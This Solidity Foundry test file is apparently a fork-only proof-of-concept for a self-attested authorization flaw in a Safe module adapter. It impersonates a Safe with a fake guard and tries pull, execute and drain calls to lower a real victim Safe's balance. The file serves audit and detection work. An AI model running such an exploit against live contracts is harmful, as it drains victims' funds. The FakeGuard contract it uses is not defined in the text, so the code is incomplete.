// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

interface IAdapter {
    function pull(address safe) external;
}

/// @title Fallback PoC -- Self-attested authorization
/// @notice Detector: self-attested-auth. The access check asks the CALLER
///         whether the caller is allowed (IThing(msg.sender).isEnabled(...)).
///         The untrusted party supplies the answer, so a contract that returns
///         true passes the check and drives the function.
/// @dev FORK-ONLY. Reference incident: FlashLoopAdapter (October 2026,
///      ~$305k) -- a Safe module authenticated its caller by asking that
///      caller whether the module was enabled, then made an unconstrained
///      call to a caller-supplied router; a fake Safe drove the adapter into
///      draining two real Safes that had enabled the module.
///      Copy to foundry/test/Exploit.t.sol and run via scripts/run-fork-poc.sh.
///      The observable is a real victim's balance falling, never the call
///      returning: the adapter is supposed to answer a fake guard.
contract PoC is Test {
    address public target;      // the adapter/module
    address public victim;      // the real Safe that enabled the module
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        victim = vm.envOr("POC_VICTIM", address(0));
        require(target != address(0), "POC_TARGET not set (the adapter)");
        require(victim != address(0), "POC_VICTIM not set (the real account that enabled it)");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "adapter has no code at this fork block");
        assertGt(victim.code.length, 0, "victim has no code at this fork block");
    }

    function test_fakeGuardDrivesRealVictim() public {
        uint256 victimBefore = victim.balance;

        // The fake guard answers "yes, enabled" to anything the adapter asks.
        FakeGuard guard = new FakeGuard(address(target));

        // Three candidate entry points: adapters name their pull/push path
        // differently, and a single guess cannot tell "absent" from "renamed".
        string[3] memory names = ["pull(address)", "execute(address)", "drain(address)"];
        bool moved = false;
        for (uint256 i = 0; i < names.length && !moved; ++i) {
            vm.prank(address(guard));
            (bool ok,) = target.call(abi.encodeWithSignature(names[i], victim));
            console.log("adapter entry through fake guard:", names[i], ok);
            moved = ok && victim.balance < victimBefore;
        }

        console.log("victim balance before/after:", victimBefore, victim.balance);

        assertTrue(
            moved,
            "the fake guard did not move the real victim's funds. Tried pull(address), execute(address) and drain(address) through a caller that answers every attestation. This does NOT establish safety: the adapter's entry point may have another name or signature, or the victim may not have enabled the module at this fork block. Confirm the adapter's caller check and the victim's exposure."
        );
    }
}
